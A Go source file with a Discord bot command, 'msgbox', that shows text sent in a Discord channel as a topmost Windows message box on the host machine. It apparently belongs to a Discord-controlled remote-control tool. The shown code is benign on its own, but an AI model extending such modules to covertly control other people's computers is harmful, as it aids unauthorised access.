package commands

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"requiem/store"

	"github.com/bwmarrin/discordgo"
)

func (*NotifCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")
	if len(content) < 1 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a message.", msg.Reference())
		return
	}

	pointer, err := syscall.UTF16PtrFromString(content)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to convert message - %s", err), msg.Reference())
		return
	}

	ret, _, err := store.MessageBox.Call(
		uintptr(0),
		uintptr(unsafe.Pointer(pointer)),
		uintptr(0),
		uintptr(0x00000000|0x00040000),
	)

	if ret == 0 {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create messagebox - %s", err), msg.Reference())
		return
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully sent messagebox.", msg.Reference())
}

func (*NotifCommand) Name() string {
	return "msgbox"
}

func (*NotifCommand) Info() string {
	return "Displays a messagebox."
}

type NotifCommand struct{}
